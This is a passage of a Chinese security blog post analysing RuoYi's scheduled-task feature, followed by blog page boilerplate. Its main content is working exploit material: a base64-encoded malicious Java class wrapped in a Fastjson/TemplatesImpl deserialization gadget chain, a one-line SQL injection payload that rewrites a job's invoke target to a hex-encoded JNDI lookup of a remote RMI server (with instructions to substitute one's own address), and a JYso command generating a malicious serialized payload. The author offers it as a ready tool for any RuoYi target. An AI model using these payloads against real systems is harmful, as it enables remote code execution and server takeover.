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&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        byte[][] bytes = new byte[][]&#123;decode&#125;;</span><br><span class="hljs-comment">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="hljs-comment">        setFieldValue(templates, &quot;_bytecodes&quot;, bytes);</span><br><span class="hljs-comment">        setFieldValue(templates, &quot;_name&quot;, &quot;123&quot;);</span><br><span class="hljs-comment">        setFieldValue(templates, &quot;_class&quot;, null);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">        objects.add(templates);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">        setFieldValue(bad,&quot;val&quot;,objects);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        HashMap hashMap = new HashMap();</span><br><span class="hljs-comment">        hashMap.put(templates,bad);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./fj.bin&quot;));</span><br><span class="hljs-comment">        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">        outputStream.close();</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./fj.bin&quot;));</span><br><span class="hljs-comment">        inputStream.readObject();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="4-7-9"><a href="#4-7-9" class="headerlink" title="4.7.9"></a>4.7.9</h3><p><img src="image-20241027000801430.png" srcset="/img/loading.gif" lazyload alt="image-20241027000801430"></p>
+<p>白名单，没得玩</p>
+<p>在就是1day，ThymeleafSSTI。</p>
+<h3 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h3><p>看js得到版本</p>
+<p>以后碰见若依用这个就行了 ，若果不行就是&gt;4.7.8</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e6c6461702e496e697469616c4c646170436f6e746578742e6c6f6f6b75702827726d693a2f2f3132372e302e302e313a313039372f6578702729 WHERE job_id = 1;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p> hex改成你的jdni地址的hex就行了 </p>
+<p>高版本jdk直接用 我的工具起一个恶意ldap去hook一下返回流就行了</p>
+<p><img src="image-20241027002808213.png" srcset="/img/loading.gif" lazyload alt="image-20241027002808213"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">生成恶意bin<br>java -jar JYso-1.3.4-all.jar -y -g Fastjson1 -p &quot;open .&quot; -f fj.bn<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2796">https://forum.butian.net/share/2796</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SpringKill-team/SecurityInspector">https://github.com/SpringKill-team/SecurityInspector</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ruoyi定时任务浅析</div>
+      <div>https://unam4.github.io/2024/10/26/ruoyi定时任务浅析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/26/xxljob-agent%E5%86%85%E5%AD%98%E9%A9%AC-2-3-1/" title="xxljob-agent内存马(&gt;=2.3.0)">
+                        <span class="hidden-mobile">xxljob-agent内存马(&gt;=2.3.0)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
